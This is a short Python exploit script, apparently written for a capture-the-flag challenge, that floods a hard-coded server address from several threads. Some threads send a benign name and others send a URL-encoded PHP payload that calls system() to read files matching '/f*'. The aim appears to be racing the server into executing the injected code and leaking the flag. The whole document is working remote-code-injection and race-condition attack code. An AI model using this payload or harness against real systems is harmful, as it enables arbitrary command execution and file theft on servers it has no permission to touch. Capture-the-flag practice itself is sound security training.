from threading import Thread
import requests

url = "http://193.136.164.147:23222/"

def the_good():
    while True:
        r = requests.get(url + "?name=test")
        if "CSCPT" in r.text:
            print(r.text)

def the_bad():
    while True:
        r = requests.get(url + '?name=<%3fphp echo system("cat /f*"); %3f>')
        if "CSCPT" in r.text:
            print(r.text)

def the_ugly():
    t1 = Thread(target=the_good)
    t2 = Thread(target=the_bad)
    t3 = Thread(target=the_bad)
    t4 = Thread(target=the_bad)
    t5 = Thread(target=the_bad)
    t6 = Thread(target=the_good)

    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()

if __name__ == "__main__":
    the_ugly()